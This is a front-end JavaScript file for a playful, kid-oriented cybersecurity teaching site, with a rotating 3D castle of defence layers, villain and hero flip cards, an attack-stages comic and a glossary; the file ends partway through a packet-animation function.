/* =========================================================
   Cyber Sketchbook — interactions
   ========================================================= */
const $ = (s, el = document) => el.querySelector(s);
const $$ = (s, el = document) => [...el.querySelectorAll(s)];
const rand = (a, b) => a + Math.random() * (b - a);
const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ---------- confetti ---------- */
function confetti(n = 80) {
  const colors = ['#ff4f8b', '#ffd23f', '#06d6a0', '#3a86ff', '#8338ec', '#fb5607'];
  for (let i = 0; i < n; i++) {
    const c = document.createElement('div');
    c.className = 'confetti';
    c.style.left = rand(0, 100) + 'vw';
    c.style.background = colors[i % colors.length];
    c.style.animationDuration = rand(1.8, 3.6) + 's';
    c.style.animationDelay = rand(0, .5) + 's';
    c.style.borderRadius = Math.random() > .5 ? '50%' : '2px';
    document.body.appendChild(c);
    setTimeout(() => c.remove(), 4500);
  }
}

/* ---------- night / day toggle ---------- */
const isDark = () => document.documentElement.dataset.theme === 'dark';
function paintToggle() {
  const b = $('#themeToggle'); if (!b) return;
  $('.icon', b).textContent = isDark() ? '☀️' : '🌙';
  $('.lbl', b).textContent = isDark() ? 'Day' : 'Night';
  b.setAttribute('aria-label', isDark() ? 'Switch to day mode' : 'Switch to night mode');
}
$('#themeToggle').addEventListener('click', () => {
  const next = isDark() ? 'light' : 'dark';
  document.documentElement.dataset.theme = next;
  try { localStorage.setItem('cyber-theme', next); } catch (e) {}
  paintToggle();
});
// follow the device setting live, unless the reader picked one themselves
matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
  let saved = null; try { saved = localStorage.getItem('cyber-theme'); } catch (_) {}
  if (!saved) { document.documentElement.dataset.theme = e.matches ? 'dark' : 'light'; paintToggle(); }
});
paintToggle();

/* ---------- scroll progress + nav highlight + reveal ---------- */
const navLinks = $$('nav.top a.note');
addEventListener('scroll', () => {
  const h = document.documentElement;
  $('#progress').style.width = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100 + '%';
  let cur = null;
  $$('section[id]').forEach(s => { if (s.getBoundingClientRect().top < 140) cur = s.id; });
  navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + cur));
}, { passive: true });

const io = new IntersectionObserver(es => es.forEach(e => { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } }), { threshold: .12 });
function observeReveals() { $$('.reveal:not(.in)').forEach(el => io.observe(el)); }

/* ---------- house analogy ---------- */
$$('.house-hotspot').forEach(g => g.addEventListener('click', () => {
  const k = g.dataset.k;
  $$('#mapTable tr').forEach(tr => tr.classList.toggle('on', tr.dataset.k === k));
}));
$$('#mapTable tr').forEach(tr => tr.addEventListener('mouseenter', () => {
  $$('#mapTable tr').forEach(t => t.classList.toggle('on', t === tr));
}));

/* ---------- CIA ---------- */
const CIA = {
  c: { t: '🤫 Confidentiality = "Keep it SECRET"', col: 'pink',
    p: 'Only the right people can see your stuff. Your diary should be read by you, not your nosy neighbour.',
    ex: ['🔐 Encryption scrambles your messages', '🔑 Passwords lock your account', '🚫 Bad: a hacker reading your private chats'] },
  i: { t: '✅ Integrity = "Keep it CORRECT"', col: 'blue',
    p: 'Nobody can secretly change your stuff. If your report card says A, no one should be able to sneakily change it to F!',
    ex: ['✍️ Digital signatures prove who wrote it', '🧮 Checksums notice any change', '🚫 Bad: a hacker changing "send $10" to "send $10,000"'] },
  a: { t: '⏰ Availability = "Keep it READY"', col: 'teal',
    p: 'Your stuff works when you need it. A game server that crashes on Saturday night = very sad gamers.',
    ex: ['💾 Backups bring things back', '🌊 DDoS protection stops traffic floods', '🚫 Bad: ransomware locking all your files'] },
};
$$('.cia-node').forEach(n => n.addEventListener('click', () => {
  const d = CIA[n.dataset.k];
  $$('.cia-node').forEach(x => x.classList.toggle('active', x === n));
  const box = $('#ciaInfo');
  box.className = 'sketch cia-info ' + d.col;
  box.innerHTML = `<h3>${d.t}</h3><p>${d.p}</p><ul>${d.ex.map(e => `<li>${e}</li>`).join('')}</ul>`;
}));

/* =========================================================
   3D CASTLE (hand-rolled 3D on canvas — no libraries)
   ========================================================= */
const LAYERS = [
  { name: 'Moat: Network watchers', emoji: '👀', col: '#06d6a0', r: 235, h: 8, p: .35, on: true, desc: 'Watches all traffic coming in.' },
  { name: 'Wall: Firewall', emoji: '🧱', col: '#fb5607', r: 190, h: 55, p: .45, on: true, desc: 'Blocks unwanted connections.' },
  { name: 'Gate: Password + 2-step', emoji: '🔑', col: '#3a86ff', r: 145, h: 90, p: .4, on: true, desc: 'Only the right people get in.' },
  { name: 'Guards: Antivirus + eBPF', emoji: '🐝', col: '#8338ec', r: 100, h: 125, p: .45, on: true, desc: 'Catch intruders who sneaked in.' },
  { name: 'Vault: Encryption', emoji: '🔐', col: '#ff4f8b', r: 58, h: 160, p: .5, on: true, desc: 'Even if stolen, data is gibberish.' },
];
(function castle() {
  const cv = $('#castle'); if (!cv) return;
  const ctx = cv.getContext('2d');
  let W, H, DPR;
  function resize() {
    DPR = Math.min(devicePixelRatio || 1, 2);
    W = cv.clientWidth; H = cv.clientHeight;
    cv.width = W * DPR; cv.height = H * DPR;
    ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  }
  resize(); addEventListener('resize', resize);

  let yaw = .6, pitch = .45, auto = true, hl = -1;
  let drag = null;
  cv.addEventListener('pointerdown', e => { drag = { x: e.clientX, y: e.clientY, yaw, pitch }; cv.setPointerCapture(e.pointerId); auto = false; });
  cv.addEventListener('pointermove', e => { if (!drag) return; yaw = drag.yaw + (e.clientX - drag.x) * .01; pitch = Math.max(.08, Math.min(1.25, drag.pitch + (e.clientY - drag.y) * .006)); });
  cv.addEventListener('pointerup', () => drag = null);
  $('#spinBtn').onclick = () => auto = !auto;

  function proj(x, y, z) {
    // rotate around Y (yaw) then X (pitch)
    const cy = Math.cos(yaw), sy = Math.sin(yaw);
    let x1 = x * cy - z * sy, z1 = x * sy + z * cy;
    const cp = Math.cos(pitch), sp = Math.sin(pitch);
    let y1 = y * cp - z1 * sp, z2 = y * sp + z1 * cp;
    const scale = Math.min(W, H) / 560;
    const f = 800 / (z2 + 900);
    return { x: W / 2 + x1 * f * scale, y: H * .62 - y1 * f * scale, z: z2 };
  }
  const INK = () => isDark() ? '#f3eedf' : '#23243a';
  // a stable wobble so lines look hand-drawn
  const wob = (i, k) => Math.sin(i * 12.9898 + k * 78.233) * 1.6;

  function ring(r, y, seg = 40) { const pts = []; for (let i = 0; i <= seg; i++) { const a = i / seg * Math.PI * 2; pts.push(proj(Math.cos(a) * r, y, Math.sin(a) * r)); } return pts; }
  function poly(pts, k = 0) { ctx.beginPath(); pts.forEach((p, i) => i ? ctx.lineTo(p.x + wob(i, k), p.y + wob(k, i)) : ctx.moveTo(p.x, p.y)); }

  function drawLayer(L, idx) {
    const seg = 40;
    const bot = ring(L.r, 0, seg), top = ring(L.r, L.h, seg);
    const alpha = L.on ? 1 : .15;
    ctx.globalAlpha = alpha;
    // side walls as quads (back first)
    const quads = [];
    for (let i = 0; i < seg; i++) quads.push({ i, z: (bot[i].z + bot[i + 1].z) / 2 });
    quads.sort((a, b) => b.z - a.z);
    for (const q of quads) {
      const i = q.i;
      ctx.beginPath(); ctx.moveTo(bot[i].x, bot[i].y); ctx.lineTo(bot[i + 1].x, bot[i + 1].y); ctx.lineTo(top[i + 1].x, top[i + 1].y); ctx.lineTo(top[i].x, top[i].y); ctx.closePath();
      ctx.fillStyle = L.col + (q.z > 0 ? '30' : '70'); ctx.fill();
    }
    // top
    poly(top, idx); ctx.fillStyle = L.col + '55'; ctx.fill();
    ctx.lineWidth = hl === idx ? 4.5 : 2.6; ctx.strokeStyle = INK();
    poly(top, idx); ctx.stroke(); poly(bot, idx + 3); ctx.stroke();
    // vertical sketch lines + crenellations
    for (let i = 0; i < seg; i += 4) {
      ctx.beginPath(); ctx.moveTo(bot[i].x, bot[i].y); ctx.lineTo(top[i].x + wob(i, idx), top[i].y); ctx.lineWidth = 1.6; ctx.stroke();
      if (L.h > 20 && i % 8 === 0) {
        const a = i / seg * Math.PI * 2, a2 = a + .08;
        const p1 = proj(Math.cos(a) * L.r, L.h, Math.sin(a) * L.r), p2 = proj(Math.cos(a) * L.r, L.h + 14, Math.sin(a) * L.r);
        const p3 = proj(Math.cos(a2) * L.r, L.h + 14, Math.sin(a2) * L.r), p4 = proj(Math.cos(a2) * L.r, L.h, Math.sin(a2) * L.r);
        ctx.beginPath(); ctx.moveTo(p1.x, p1.y); ctx.lineTo(p2.x, p2.y); ctx.lineTo(p3.x, p3.y); ctx.lineTo(p4.x, p4.y); ctx.fillStyle = L.col; ctx.fill(); ctx.stroke();
      }
    }
    // label emoji floating on the front
    const front = proj(Math.sin(yaw) * L.r, L.h + 18, -Math.cos(yaw) * L.r);
    ctx.globalAlpha = L.on ? 1 : .35;
    ctx.font = '22px serif'; ctx.textAlign = 'center'; ctx.fillText(L.emoji, front.x, front.y);
    ctx.globalAlpha = 1;
  }

  function drawGem(t) {
    const c = proj(0, 190 + Math.sin(t / 400) * 8, 0);
    ctx.save(); ctx.translate(c.x, c.y); ctx.rotate(Math.sin(t / 700) * .2);
    ctx.beginPath(); ctx.moveTo(0, -28); ctx.lineTo(22, -6); ctx.lineTo(0, 30); ctx.lineTo(-22, -6); ctx.closePath();
    ctx.fillStyle = '#ffd23f'; ctx.fill(); ctx.lineWidth = 3; ctx.strokeStyle = '#23243a'; ctx.stroke();
    ctx.beginPath(); ctx.moveTo(-22, -6); ctx.lineTo(22, -6); ctx.moveTo(0, -28); ctx.lineTo(-7, -6); ctx.lineTo(0, 30); ctx.lineTo(7, -6); ctx.closePath(); ctx.lineWidth = 1.5; ctx.stroke();
    ctx.font = '16px "Permanent Marker", cursive'; ctx.fillStyle = INK(); ctx.textAlign = 'center'; ctx.fillText('your data', 0, -38);
    ctx.restore();
  }

  function drawGround() {
    ctx.strokeStyle = INK() + '22'; ctx.lineWidth = 1;
    for (let r = 280; r <= 320; r += 40) { poly(ring(r, 0, 60)); ctx.stroke(); }
    for (let a = 0; a < 12; a++) {
      const ang = a / 12 * Math.PI * 2;
      const p1 = proj(Math.cos(ang) * 240, 0, Math.sin(ang) * 240), p2 = proj(Math.cos(ang) * 320, 0, Math.sin(ang) * 320);
      ctx.beginPath(); ctx.moveTo(p1.x, p1.y); ctx.lineTo(p2.x, p2.y); ctx.stroke();
    }
  }

  // attackers
  let bad = [], bursts = [], blocked = 0, reached = 0;
  function spawn() {
    const a = rand(0, Math.PI * 2);
    bad.push({ a, r: 330, y: rand(25, 70), v: rand(1.3, 2.1), checked: new Set() });
  }
  $('#attackBtn').onclick = () => { for (let i = 0; i < 24; i++) setTimeout(spawn, i * 120); };

  function step() {
    for (const b of bad) {
      b.r -= b.v;
      LAYERS.forEach((L, i) => {
        if (b.dead || b.checked.has(i) || b.r > L.r) return;
        b.checked.add(i);
        if (L.on && Math.random() < L.p) {
          b.dead = true; blocked++;
          const p = { x: Math.cos(b.a) * L.r, y: Math.min(b.y, L.h + 10), z: Math.sin(b.a) * L.r };
          bursts.push({ ...p, t: 0, col: L.col });
        }
      });
      if (!b.dead && b.r <= 15) { b.dead = true; reached++; bursts.push({ x: 0, y: 160, z: 0, t: 0, col: '#ef233c', big: true }); }
    }
    bad = bad.filter(b => !b.dead);
    $('#blockedCount').textContent = blocked; $('#reachedCount').textContent = reached;
  }

  function frame(t) {
    if (auto && !drag) yaw += .004;
    ctx.clearRect(0, 0, W, H);
    drawGround();
    // draw outer → inner so inner towers paint on top
    LAYERS.forEach(drawLayer);
    drawGem(t);
    step();
    for (const b of bad) {
      const p = proj(Math.cos(b.a) * b.r, b.y, Math.sin(b.a) * b.r);
      ctx.beginPath(); ctx.arc(p.x, p.y, 8, 0, Math.PI * 2); ctx.fillStyle = '#ef233c'; ctx.fill(); ctx.lineWidth = 2; ctx.strokeStyle = '#23243a'; ctx.stroke();
      ctx.fillStyle = '#fff'; ctx.fillRect(p.x - 4, p.y - 3, 2.5, 2.5); ctx.fillRect(p.x + 1.5, p.y - 3, 2.5, 2.5);
    }
    bursts.forEach(bu => {
      bu.t++;
      const p = proj(bu.x, bu.y, bu.z), s = bu.big ? 30 : 14, k = bu.t / 30;
      ctx.globalAlpha = 1 - k; ctx.strokeStyle = bu.col; ctx.lineWidth = 4;
      for (let i = 0; i < 8; i++) { const a = i / 8 * Math.PI * 2; ctx.beginPath(); ctx.moveTo(p.x + Math.cos(a) * s * k, p.y + Math.sin(a) * s * k); ctx.lineTo(p.x + Math.cos(a) * s * (k + .5), p.y + Math.sin(a) * s * (k + .5)); ctx.stroke(); }
      ctx.font = 'bold 18px "Permanent Marker", cursive'; ctx.fillStyle = bu.big ? '#ef233c' : INK(); ctx.textAlign = 'center';
      ctx.fillText(bu.big ? 'OUCH! 💥' : '✋', p.x, p.y - 14 - k * 20);
      ctx.globalAlpha = 1;
    });
    bursts = bursts.filter(b => b.t < 30);
    requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);

  // layer list UI
  const ul = $('#layerList');
  LAYERS.forEach((L, i) => {
    const li = document.createElement('li');
    li.innerHTML = `<span class="dot" style="background:${L.col}"></span><span>${L.emoji} <b>${L.name}</b><br><small>${L.desc} <span class="st">✅ ON</span></small></span>`;
    li.onmouseenter = () => hl = i; li.onmouseleave = () => hl = -1;
    li.onclick = () => { L.on = !L.on; li.style.opacity = L.on ? 1 : .5; $('.st', li).textContent = L.on ? '✅ ON' : '❌ OFF'; };
    ul.appendChild(li);
  });
})();

/* =========================================================
   VILLAINS & HEROES (flip cards)
   ========================================================= */
const VILLAINS = [
  { e: '🎣', n: 'Phishing', tag: 'The Trickster', d: 5, c: 'pink', how: 'Sends fake emails or texts pretending to be someone you trust, to make you click a bad link or tell secrets.', ex: '"Your account is locked! Click here!"', beat: 'Stop, look at the sender, never click in a panic.' },
  { e: '🦠', n: 'Malware', tag: 'The Germ', d: 4, c: 'teal', how: 'Bad software that sneaks onto your device inside fake games, apps or downloads, then does nasty things.', ex: 'A "free" game download that steals passwords.', beat: 'Only download from official app stores. Use antivirus.' },
  { e: '🔒💰', n: 'Ransomware', tag: 'The Kidnapper', d: 5, c: 'orange', how: 'Locks all your files with a secret code and says: "Pay me or never see your photos again!"', ex: 'A hospital\'s computers all frozen with a ransom note.', beat: 'Keep backups! Then you can just restore and ignore them.' },
  { e: '🔨', n: 'Password Guessing', tag: 'The Lock-Basher', d: 3, c: 'yellow', how: 'Robots try millions of passwords per second: 123456, password, qwerty…', ex: 'Trying every word in the dictionary on your account.', beat: 'Long passphrases + 2-step login.' },
  { e: '🌊', n: 'DDoS', tag: 'The Crowd', d: 3, c: 'blue', how: 'Thousands of hacked computers all knock on a website\'s door at once until it falls over.', ex: 'A game server crashing at launch day.', beat: 'Traffic filters, CDNs and eBPF/XDP drop the junk.' },
  { e: '🕵️', n: 'Eavesdropper', tag: 'Man-in-the-Middle', d: 3, c: 'purple', how: 'Sits secretly between you and a website (often on free café Wi-Fi) to read or change messages.', ex: 'Fake "Free_Airport_WiFi" hotspot.', beat: 'Look for 🔒 HTTPS, avoid unknown Wi-Fi, use a VPN.' },
  { e: '🎭', n: 'Social Engineering', tag: 'The Actor', d: 4, c: 'pink', how: 'Hacks the HUMAN, not the computer. Pretends to be IT support, a friend, or your boss.', ex: '"Hi, I\'m from tech support, what\'s your password?"', beat: 'Verify who they are through another way.' },
  { e: '🕳️', n: 'Zero-day Bug', tag: 'The Secret Hole', d: 4, c: 'teal', how: 'Uses a hole in software that nobody knew about yet, so there\'s no fix on day zero.', ex: 'A bug in a browser that lets a website run code.', beat: 'Install updates fast + monitoring to spot weird behaviour.' },
  { e: '🤖🎭', n: 'Deepfakes & AI Scams', tag: 'The Shapeshifter', d: 4, c: 'purple', how: 'Uses AI to fake a real person\'s face or voice in videos, calls or voice notes.', ex: 'A call that sounds exactly like your mum: "Quick, I need gift card codes!"', beat: 'Hang up and call back on their real number. Agree a family code word.' },
  { e: '🧟', n: 'Botnet', tag: 'The Zombie Army', d: 3, c: 'orange', how: 'Secretly takes over thousands of weak devices (cameras, routers) and makes them attack together.', ex: 'Smart cameras still using password "admin" flooding a website.', beat: 'Change default passwords and keep devices updated.' },
  { e: '🧪', n: 'Supply-chain Attack', tag: 'The Poisoned Ingredient', d: 5, c: 'yellow', how: 'Instead of attacking you, it poisons a tool or update that LOTS of people trust, so it spreads to all of them.', ex: 'A hacked app update delivered to thousands of companies at once.', beat: 'Signed updates, trusted sources, and checking what\'s inside your software.' },
  { e: '🐀', n: 'Insider Threat', tag: 'The Mole', d: 3, c: 'blue', how: 'Someone already inside (a worker or helper) misuses their access, or makes a careless mistake.', ex: 'An employee copying customer data before leaving the company.', beat: 'Least privilege + logs and monitoring (hello, eBPF!).' },
];
const HEROES = [
  { e: '🧱', n: 'Firewall', tag: 'The Gatekeeper', c: 'orange', power: 'Checks every packet against rules: "Is this allowed in? No? BLOCKED."', beats: 'Eavesdroppers, scanners, DDoS' },
  { e: '🔐', n: 'Encryption', tag: 'The Code-Maker', c: 'purple', power: 'Scrambles data so only someone with the key can read it. Stolen data = useless gibberish.', beats: 'Eavesdroppers, data thieves' },
  { e: '📱', n: '2-Step Login (MFA)', tag: 'The Double-Checker', c: 'blue', power: 'Asks for password + something you HAVE (phone code, fingerprint). One stolen password is not enough.', beats: 'Password guessing, phishing' },
  { e: '🐕', n: 'Antivirus / EDR', tag: 'The Sniffer Dog', c: 'yellow', power: 'Sniffs files and behaviour to spot known and weird-acting malware, then quarantines it.', beats: 'Malware, ransomware' },
  { e: '🔄', n: 'Updates', tag: 'The Patcher', c: 'teal', power: 'Fixes holes in software before villains can squeeze through. That annoying "update now" button is a hero!', beats: 'Zero-day bugs, malware' },
  { e: '💾', n: 'Backups', tag: 'The Time Traveller', c: 'pink', power: 'Keeps copies of your files somewhere safe. If disaster strikes, travel back in time and restore.', beats: 'Ransomware, accidents' },
  { e: '🗝️', n: 'Password Manager', tag: 'The Keykeeper', c: 'blue', power: 'Remembers a different super-strong password for every site, so you only remember one.', beats: 'Password guessing, leaks' },
  { e: '🐝', n: 'eBPF Monitoring', tag: 'The Inside Watcher', c: 'purple', power: 'Tiny programs inside the kernel see every program start, file open and connection, and can block bad ones.', beats: 'Malware, sneaky insiders, DDoS' },
  { e: '🚇', n: 'VPN', tag: 'The Secret Tunnel', c: 'teal', power: 'Wraps all your internet traffic in an encrypted tunnel, so people on the same café Wi-Fi can\'t snoop.', beats: 'Eavesdroppers on public Wi-Fi' },
  { e: '🚪', n: 'Zero Trust', tag: 'The Strict Doorman', c: 'orange', power: 'Checks who you are at EVERY door and gives only the access you need (least privilege).', beats: 'Insiders, stolen passwords, spreading malware' },
  { e: '👩‍🚒', n: 'Security Team (SOC)', tag: 'The Fire Brigade', c: 'pink', power: 'Watches alarms day and night, jumps in when something happens, and cleans up afterwards.', beats: 'Anything that slips past the walls' },
  { e: '🧠', n: 'YOU! (Awareness)', tag: 'The Human Firewall', c: 'yellow', power: 'Stops, thinks and asks before clicking. Most attacks need a human to make a mistake, so a smart human beats them.', beats: 'Phishing, social engineering, deepfakes' },
];
function flipCard(front, back) {
  const d = document.createElement('div');
  d.className = 'flip reveal'; d.tabIndex = 0; d.setAttribute('role', 'button');
  d.innerHTML = `<div class="flip-inner">${front}${back}</div>`;
  const toggle = () => d.classList.toggle('flipped');
  d.addEventListener('click', toggle);
  d.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); } });
  return d;
}
VILLAINS.forEach((v, i) => {
  const meter = Array.from({ length: 5 }, (_, k) => `<span class="${k < v.d ? 'on' : ''}"></span>`).join('');
  $('#villainGrid').appendChild(flipCard(
    `<div class="flip-face sketch ${v.c} ${i % 2 ? 'alt' : ''}"><div style="font-size:4rem" class="wiggle">${v.e}</div><h3>${v.n}</h3><div class="tag">"${v.tag}"</div><div style="margin-top:.6rem;font-size:.9rem">danger: </div><div class="danger-meter">${meter}</div><span class="flip-hint">tap to flip ↻</span></div>`,
    `<div class="flip-face back sketch"><h3>${v.e} ${v.n}</h3><p><b>How it works:</b> ${v.how}</p><p><b>Example:</b> <i>${v.ex}</i></p><p style="background:#d6fbef;border-radius:8px;padding:.3rem .5rem"><b>🛡️ Beat it:</b> ${v.beat}</p></div>`
  ));
});
HEROES.forEach((h, i) => {
  $('#heroGrid').appendChild(flipCard(
    `<div class="flip-face sketch ${h.c} ${i % 2 ? '' : 'alt'}"><div style="font-size:4rem" class="mascot-float">${h.e}</div><h3>${h.n}</h3><div class="tag">"${h.tag}"</div><span class="flip-hint">tap to flip ↻</span></div>`,
    `<div class="flip-face back sketch"><h3>${h.e} ${h.n}</h3><p><b>⚡ Superpower:</b> ${h.power}</p><p style="background:#ffe0eb;border-radius:8px;padding:.3rem .5rem"><b>Defeats:</b> ${h.beats}</p></div>`
  ));
});

/* ---------- comic ---------- */
const S = (inner) => `<svg viewBox="0 0 300 150" aria-hidden="true">${inner}</svg>`;
const T = (x, y, s, txt, extra = '') => `<text x="${x}" y="${y}" font-size="${s}" text-anchor="middle" ${extra}>${txt}</text>`;
const bubble = (x, y, w, txt, col = '#fff') => `<rect x="${x}" y="${y}" width="${w}" height="30" rx="10" fill="${col}" stroke="#23243a" stroke-width="2.5"/><text x="${x + w / 2}" y="${y + 20}" text-anchor="middle" font-family="Patrick Hand" font-size="15">${txt}</text>`;
const COMIC = [
  { t: 'Spy 🔭 (Recon)', p: 'The hacker snoops around: who works here? What apps do they use?', d: 'Defend: share less online, hide what software you run.',
    s: S(`<rect width="300" height="150" fill="#dde9ff"/>${T(70, 105, 60, '🦹')}${T(150, 85, 34, '🔭')}${T(250, 100, 50, '🏢')}${bubble(15, 12, 170, '"Hmm, who works here?"')}`) },
  { t: 'Bait 🎣 (Delivery)', p: 'They send a tricky email with a booby-trapped attachment.', d: 'Defend: email filters + people trained to spot phish!',
    s: S(`<rect width="300" height="150" fill="#fff3b8"/>${T(60, 105, 56, '🦹')}${T(150, 95, 40, '✉️')}${T(240, 105, 56, '🧑‍💻')}<path d="M100 80 Q150 40 200 80" stroke="#23243a" stroke-width="3" fill="none" stroke-dasharray="6 5" marker-end="url(#arrow)"/>${bubble(160, 12, 130, '"Ooh, a prize!"')}`) },
  { t: 'Break-in 🚪 (Exploit)', p: 'Someone clicks. The hidden virus uses a software bug to sneak in.', d: 'Defend: updates close the bug; antivirus catches the file.',
    s: S(`<rect width="300" height="150" fill="#ffe0eb"/>${T(150, 110, 70, '💻')}${T(100, 70, 36, '🦠')}${T(200, 60, 30, '💥')}${bubble(170, 100, 120, '"Click!" 😬')}`) },
  { t: 'Hide 🫥 (Persistence)', p: 'The virus hides and makes a secret back door to come back later.', d: 'Defend: eBPF/EDR spots weird new programs & connections.',
    s: S(`<rect width="300" height="150" fill="#eadcff"/>${T(110, 110, 70, '🗄️')}${T(170, 80, 30, '🦠')}${T(245, 100, 46, '🐝')}${bubble(170, 12, 120, '"I see you!"', '#fff3b8')}`) },
  { t: 'Steal 💰 (Action)', p: 'Now they grab data or lock files for ransom.', d: 'Defend: encryption makes data useless; backups beat ransom.',
    s: S(`<rect width="300" height="150" fill="#ffe3d3"/>${T(70, 105, 56, '🦹')}${T(160, 95, 46, '🔒')}${T(240, 95, 46, '📁')}${bubble(15, 12, 150, '"Pay me! 💸"', '#ffc2d1')}`) },
  { t: 'Caught! 🚨 (Respond)', p: 'Defenders see the alarm, kick the hacker out, restore backups and learn.', d: 'Win: Detect → Respond → Recover → get stronger!',
    s: S(`<rect width="300" height="150" fill="#d6fbef"/>${T(70, 110, 56, '🦸')}${T(150, 70, 36, '🚨')}${T(240, 115, 40, '🦹')}${T(240, 70, 30, '⛓️')}${bubble(15, 12, 130, '"Gotcha!" 😎')}`) },
];
COMIC.forEach((c, i) => {
  const d = document.createElement('div'); d.className = 'panel reveal';
  d.innerHTML = `<div class="num">${i + 1}</div>${c.s}<h4>${c.t}</h4><p>${c.p}</p><div class="defend">🛡️ ${c.d}</div>`;
  $('#comic').appendChild(d);
});

/* ---------- real world ---------- */
const WORLD = [
  ['🏦', 'Online banking', 'Strangers could empty accounts.', 'You can pay safely from your phone.', 'yellow'],
  ['🏥', 'Hospitals', 'Patient records locked or changed.', 'Doctors get the right info, fast.', 'pink'],
  ['⚡', 'Power & water', 'Cities could go dark.', 'Lights stay on, water stays clean.', 'blue'],
  ['🎮', 'Games', 'Stolen accounts & cheating.', 'Fair play, your skins stay yours.', 'purple'],
  ['💬', 'Chatting', 'Strangers reading private messages.', 'End-to-end encryption keeps chats private.', 'teal'],
  ['🚗', 'Cars & planes', 'Someone remotely messing with brakes.', 'Safe trips, every time.', 'orange'],
  ['🗳️', 'Elections', 'Votes changed or faked.', 'Results people can trust.', 'yellow'],
  ['🏠', 'Smart homes', 'Hacked cameras and door locks.', 'Your home stays your home.', 'pink'],
  ['🚀', 'Space', 'Satellites hijacked.', 'GPS & weather keep working.', 'blue'],
  ['☁️', 'The cloud', 'Everyone\'s photos & files leaked at once.', 'Your stuff is safe in faraway data centers.', 'purple'],
  ['📱', 'Phones & apps', 'Spy apps reading messages and location.', 'App stores check apps; your phone stays yours.', 'teal'],
  ['🏭', 'Factories & trains', 'Machines and signals controlled by strangers.', 'Things get made and moved safely.', 'orange'],
];
WORLD.forEach(([e, t, without, withS, c], i) => {
  const d = document.createElement('div'); d.className = `sketch world-card reveal ${c} ${i % 2 ? 'alt' : ''}`;
  d.innerHTML = `<span class="emoji">${e}</span><h3>${t}</h3><div class="without">😱 Without security: ${without}</div><div class="with">😊 With security: ${withS}</div>`;
  $('#worldGrid').appendChild(d);
});

/* ---------- glossary ---------- */
const GLOSS = [
  ['Hacker 👩‍💻', 'Someone skilled with computers. "White hats" protect, "black hats" attack.'],
  ['Virus 🦠', 'A program that copies itself and spreads, like a cold.'],
  ['Malware 👾', 'Any bad software: viruses, worms, spyware, ransomware.'],
  ['Firewall 🧱', 'A gatekeeper that allows or blocks network traffic.'],
  ['Encryption 🔐', 'Scrambling data so only the key-holder can read it.'],
  ['Phishing 🎣', 'Fake messages trying to trick you.'],
  ['2FA / MFA 📱', 'Logging in with 2 proofs: password + phone code.'],
  ['Patch 🩹', 'An update that fixes a security hole.'],
  ['Kernel 🧠', 'The core boss program of an operating system.'],
  ['eBPF 🐝', 'Safe mini-programs that run inside the Linux kernel to watch & protect.'],
  ['Packet 📦', 'A tiny envelope of data travelling across the internet.'],
  ['DDoS 🌊', 'Flooding a service with junk traffic so it crashes.'],
  ['VPN 🚇', 'A private encrypted tunnel through the internet.'],
  ['Zero-day 🕳️', 'A bug nobody knew about, so no fix exists yet.'],
  ['Bug bounty 💰', 'Companies paying good hackers to report holes.'],
  ['Authentication 🪪', 'Proving who you are (password, phone code, fingerprint).'],
  ['Authorization 🎟️', 'What you\'re allowed to do once you\'re in.'],
  ['Least privilege 🔑', 'Give everyone only the access they truly need.'],
  ['Zero Trust ✈️', 'Never trust, always verify, at every door.'],
  ['Hash 🫆', 'A one-way fingerprint of data. Same input → same hash.'],
  ['Salt 🧂', 'Random extra bits mixed in before hashing a password.'],
  ['SQL injection 💉', 'Sneaking database instructions into a form box.'],
  ['XSS 💬', 'Sneaking code into a web page so it runs in other people\'s browsers.'],
  ['Vulnerability 🕳️', 'A weak spot that could let an attacker in.'],
  ['Risk ☔', 'How likely something bad is × how much it would hurt.'],
  ['Botnet 🧟', 'An army of hacked devices controlled by one attacker.'],
  ['Deepfake 🎭', 'AI-made fake video or voice of a real person.'],
  ['Cookie 🍪', 'A small note a website stores in your browser.'],
  ['Sandbox 🏖️', 'A locked play area where suspicious code can\'t hurt anything.'],
  ['SOC 👩‍🚒', 'Security Operations Center: the team watching the alarms.'],
  ['CTF 🚩', 'Capture The Flag: legal hacking games for practice.'],
  ['Red / Blue team 🔴🔵', 'Attackers-with-permission vs defenders.'],
  ['Digital footprint 👣', 'The trail of info you leave online.'],
];
const gc = ['#ffd23f', '#7ff0cc', '#ffb3cc', '#c9b3ff', '#a8d1ff', '#ffc89e'];
GLOSS.forEach(([w, m], i) => {
  const d = document.createElement('div'); d.className = 'gloss';
  d.style.setProperty('--c', gc[i % gc.length]); d.style.setProperty('--r', (i % 2 ? 1 : -1) * rand(1, 4) + 'deg');
  d.innerHTML = `<b>${w}</b>${m}`;
  $('#glossWall').appendChild(d);
});

/* =========================================================
   PACKET JOURNEY
   ========================================================= */
(function journey() {
  const path = $('#jpath'), g = $('#packets'), log = $('#jlog');
  const NS = 'http://www.w3.org/2000/svg';
  const L = path.getTotalLength();
  let fwAt = 0; // fraction of path where firewall sits (x≈500)
  for (let i = 0; i <= 200; i++) { if (path.getPointAtLength(L * i / 200).x >= 500) { fwAt = i / 200; break; } }
  function say(cls, txt) { const d = document.createElement('div'); d.className = cls; d.textContent = txt; log.appendChild(d); log.scrollTop = log.scrollHeight; }
  function bubble() { const b = $('#fwBubble'); b.setAttribute('opacity', 1); clearTimeout(b._t); b._t = setTimeout(() => b.setAttribute('opacity', 0), 900); }
  function packet({ emoji, col, label, reverse = false, blockAt = null, speed = 2600, onDone }) {
    const el = document.createElementNS(NS, 'g');
    el.innerHTML = `<rect x="-22" y="-16" width="44" height="32" rx="7" fill="${col}" stroke="#23243a" stroke-width="3"/><text y="8" text-anchor="middle" font-size="20">${emoji}</text>${label ? `<text y="-24" text-anchor="middle" font-family="Patrick Hand" font-size="14">${label}</text>` : ''}`;
    g.appendChild(el);
    const t0 = performance.now();
    (function tick(now) {
      let k = Math.min(1, (now - t0) / speed);
      let f = reverse ? 1 - k : k;
      if (blockAt !== null && (reverse ? f <= blockAt : f >= blockAt)) {
        const p = path.getPointAtLength(L * blockAt);
        el.setAttribute('transform', `translate(${p.x} ${p.y}) rotate(25)`);
